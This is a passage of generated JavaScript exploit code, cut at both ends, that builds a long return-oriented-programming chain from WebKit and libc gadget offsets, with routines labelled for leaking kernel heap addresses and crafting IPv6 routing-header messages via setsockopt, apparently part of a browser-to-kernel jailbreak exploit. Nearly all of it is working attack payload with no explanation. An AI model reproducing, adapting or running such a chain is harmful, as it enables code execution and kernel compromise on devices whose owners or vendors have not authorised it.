webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+294952,//L5304
webkit_base+4687784,
libc_base+165442
]);
//L5303:
db([0,0]);
set_gadget(libc_base+768796,);
//L5304:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+295048,//L5306
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+295032,//L5305
webkit_base+4687784,
libc_base+165442
]);
//L5305:
db([0,0]);
set_gadget(libc_base+768796,);
//L5306:
db([0,0]);
//L5290:
//L5307:
set_gadgets([
libc_base+713278,
ropchain+295112,//L5310
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5308:
db([4294967024,4294967295]);// -0x110
set_gadget(libc_base+772328,);
//L5310:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+295200,//L5312
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+295216,//L5313
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5312:
db([0,0]);
set_gadget(libc_base+772328,);
//L5313:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+295376,//L5315
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+295408,//L5317
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+295360,//L5314
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+295392,//L5316
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5314:
db([0,0]);
set_gadget(libc_base+165442,);
//L5315:
db([0,0]);
set_gadget(libc_base+772328,);
//L5316:
db([0,0]);
set_gadget(libc_base+768796,);
//L5317:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+295504,//L5319
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+295488,//L5318
webkit_base+4687784,
libc_base+165442
]);
//L5318:
db([0,0]);
set_gadget(libc_base+768796,);
//L5319:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+295592,//L5321
webkit_base+4687784,
libc_base+713278
]);
//L5320:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L5321:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+295664,//L5324
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5322:
db([4294967024,4294967295]);// -0x110
set_gadget(libc_base+772328,);
//L5324:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+295728,//L5326
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5326:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+290504,//L5196
//L5229:
//L5327:
libc_base+489696,//pop rsp
ropchain+277992,//L4881
//L5190:
libc_base+713278,
ropchain+295856,//L5330
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5328:
db([4294967032,4294967295]);// -0x108
set_gadget(libc_base+772328,);
//L5330:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+295944,//L5332
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+295960,//L5333
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5332:
db([0,0]);
set_gadget(libc_base+772328,);
//L5333:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+296120,//L5335
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+296152,//L5337
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+296104,//L5334
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+296136,//L5336
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5334:
db([0,0]);
set_gadget(libc_base+165442,);
//L5335:
db([0,0]);
set_gadget(libc_base+772328,);
//L5336:
db([0,0]);
set_gadget(libc_base+768796,);
//L5337:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+296248,//L5339
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+296232,//L5338
webkit_base+4687784,
libc_base+165442
]);
//L5338:
db([0,0]);
set_gadget(libc_base+768796,);
//L5339:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5341:
db([65535,0]);// 0xffff
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+296360,//L5343
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5343:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278,
ropchain+296512,//L5345
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+296528,//L5346
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+296496,//L5344
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5344:
db([0,0]);
set_gadget(libc_base+165442,);
//L5345:
db([0,0]);
set_gadget(libc_base+768796,);
//L5346:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+296656,//L5348
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+296672,//L5349
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+296640,//L5347
webkit_base+4687784,
libc_base+165442
]);
//L5347:
db([0,0]);
set_gadget(libc_base+772328,);
//L5348:
db([0,0]);
set_gadget(libc_base+768796,);
//L5349:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+296776,//L5350
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+296792,//L5351
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L5350:
db([0,0]);
set_gadget(libc_base+768796,);
//L5351:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+296912,//L5352
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+296896,//L5353
webkit_base+4687784,
libc_base+768796
]);
//L5353:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L5352:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+297000,//L5355
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+296984,//L5354
webkit_base+4687784,
libc_base+165442
]);
//L5354:
db([0,0]);
set_gadget(libc_base+768796,);
//L5355:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+297104,//L5356
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+297120,//L5357
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L5356:
db([0,0]);
set_gadget(libc_base+768796,);
//L5357:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+297240,//L5358
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+297224,//L5359
webkit_base+4687784,
libc_base+768796
]);
//L5359:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L5358:
db([0,0]);
//L4355:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+298568,//L5360
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L5360:
db([0,0]);
//_leak_kmalloc:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+298640,//L5362
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L5362:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+298704,//L5364
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L5364:
db([0,0]);
set_gadget(libc_base+713278,);
db([264,0]);// 0x108
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5365:
db([40,0]);// 0x28
set_gadget(libc_base+772328,);
//L5367:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+298856,//L5369
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+298872,//L5370
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5369:
db([0,0]);
set_gadget(libc_base+772328,);
//L5370:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+299032,//L5372
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+299064,//L5374
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+299016,//L5371
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+299048,//L5373
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5371:
db([0,0]);
set_gadget(libc_base+165442,);
//L5372:
db([0,0]);
set_gadget(libc_base+772328,);
//L5373:
db([0,0]);
set_gadget(libc_base+768796,);
//L5374:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+299160,//L5376
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+299144,//L5375
webkit_base+4687784,
libc_base+165442
]);
//L5375:
db([0,0]);
set_gadget(libc_base+768796,);
//L5376:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+299256,//L5379
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5377:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L5379:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+299344,//L5381
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+299360,//L5382
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5381:
db([0,0]);
set_gadget(libc_base+772328,);
//L5382:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+299504,//L5385
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+299472,//L5383
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+299488,//L5384
webkit_base+4687784,
libc_base+165442
]);
//L5383:
db([0,0]);
set_gadget(libc_base+772328,);
//L5384:
db([0,0]);
set_gadget(libc_base+768796,);
//L5385:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5387:
ropchain+299608,//L5386
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+248952,//_build_rthdr_msg
//L5386:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+299696,//L5390
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5388:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L5390:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5391:
db([4294967292,4294967295]);// -0x4
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+299824,//L5394
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+299840,//L5395
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5394:
db([0,0]);
set_gadget(libc_base+772328,);
//L5395:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+300000,//L5397
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+300032,//L5399
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+299984,//L5396
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+300016,//L5398
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5396:
db([0,0]);
set_gadget(libc_base+165442,);
//L5397:
db([0,0]);
set_gadget(libc_base+772328,);
//L5398:
db([0,0]);
set_gadget(libc_base+768796,);
//L5399:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+300128,//L5401
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+300112,//L5400
webkit_base+4687784,
libc_base+165442
]);
//L5400:
db([0,0]);
set_gadget(libc_base+768796,);
//L5401:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+300224,//L5404
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5402:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L5404:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+300312,//L5406
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+300328,//L5407
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5406:
db([0,0]);
set_gadget(libc_base+772328,);
//L5407:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+300472,//L5410
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+300440,//L5408
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+300456,//L5409
webkit_base+4687784,
libc_base+165442
]);
//L5408:
db([0,0]);
set_gadget(libc_base+772328,);
//L5409:
db([0,0]);
set_gadget(libc_base+768796,);
//L5410:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5411:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5412:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+300664,//L5415
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5413:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5415:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+300752,//L5417
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+300768,//L5418
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5417:
db([0,0]);
set_gadget(libc_base+772328,);
//L5418:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+300928,//L5420
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+300960,//L5422
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+300912,//L5419
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+300944,//L5421
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5419:
db([0,0]);
set_gadget(libc_base+165442,);
//L5420:
db([0,0]);
set_gadget(libc_base+772328,);
//L5421:
db([0,0]);
set_gadget(libc_base+768796,);
//L5422:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+301056,//L5424
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+301040,//L5423
webkit_base+4687784,
libc_base+165442
]);
//L5423:
db([0,0]);
set_gadget(libc_base+768796,);
//L5424:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5426:
ropchain+301160,//L5425
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+304352,//L5427
//L5425:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+301304,//L5429
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+301320,//L5430
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+301288,//L5428
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5428:
db([0,0]);
set_gadget(libc_base+165442,);
//L5429:
db([0,0]);
set_gadget(libc_base+768796,);
//L5430:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+301448,//L5433
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+301480,//L5435
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+301464,//L5434
webkit_base+4687784,
libc_base+713278
]);
//L5432:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5433:
db([0,0]);
set_gadget(libc_base+165442,);
//L5434:
db([0,0]);
set_gadget(libc_base+768796,);
//L5435:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+301592,//L5436+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+301584,//L5436
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5436:
db([0,0]);
set_gadgets([
ropchain+301608,//L5436+24
ropchain+302072,//L5431
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+301680,//L5439
webkit_base+4687784,
libc_base+768796
]);
//L5437:
db([0,0]);
set_gadget(libc_base+165442,);
//L5438:
db([0,0]);
set_gadget(libc_base+772328,);
//L5439:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+301840,//L5441
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+301872,//L5443
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+301824,//L5440
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+301856,//L5442
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5440:
db([0,0]);
set_gadget(libc_base+165442,);
//L5441:
db([0,0]);
set_gadget(libc_base+772328,);
//L5442:
db([0,0]);
set_gadget(libc_base+768796,);
//L5443:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+301952,//L5444
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+301968,//L5445
webkit_base+4687784,
libc_base+165442
]);
//L5444:
db([0,0]);
set_gadget(libc_base+768796,);
//L5445:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+302064,//L5447
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+302048,//L5446
webkit_base+4687784,
libc_base+165442
]);
//L5446:
db([0,0]);
set_gadget(libc_base+768796,);
//L5447:
db([0,0]);
//L5431:
set_gadget(libc_base+768796,);
//L5448:
db([256,0]);// 0x100
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+302176,//L5450
webkit_base+4687784,
libc_base+713278
]);
//L5449:
db([4294967036,4294967295]);// -0x104
set_gadget(libc_base+768796,);
//L5450:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+302280,//L5453
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5451:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L5453:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+302368,//L5455
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+302384,//L5456
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5455:
db([0,0]);
set_gadget(libc_base+772328,);
//L5456:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+302544,//L5458
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+302576,//L5460
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+302528,//L5457
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+302560,//L5459
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5457:
db([0,0]);
set_gadget(libc_base+165442,);
//L5458:
db([0,0]);
set_gadget(libc_base+772328,);
//L5459:
db([0,0]);
set_gadget(libc_base+768796,);
//L5460:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+302672,//L5462
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+302656,//L5461
webkit_base+4687784,
libc_base+165442
]);
//L5461:
db([0,0]);
set_gadget(libc_base+768796,);
//L5462:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5464:
ropchain+302776,//L5463
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+190952,//_get_rthdr
//L5463:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+302864,//L5466
webkit_base+4687784,
libc_base+713278
]);
//L5465:
db([4294967036,4294967295]);// -0x104
set_gadget(libc_base+768796,);
//L5466:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+302944,//L5468
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5468:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+303000,//L5470
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5470:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L5471:
db([104,0]);// 0x68
set_gadget(libc_base+768796,);
//L5472:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+303128,//L5474
webkit_base+4687784,
libc_base+713278
]);
//L5473:
db([0,0]);
set_gadget(libc_base+768796,);
//L5474:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5475:
db([0,0]);
set_gadget(libc_base+772328,);
//L5476:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+303312,//L5477
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+303328,//L5478
webkit_base+4687784,
libc_base+772328
]);
//L5477:
db([0,0]);
set_gadget(libc_base+768796,);
//L5478:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+303416,//L5480
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5480:
db([0,0]);
set_gadgets([
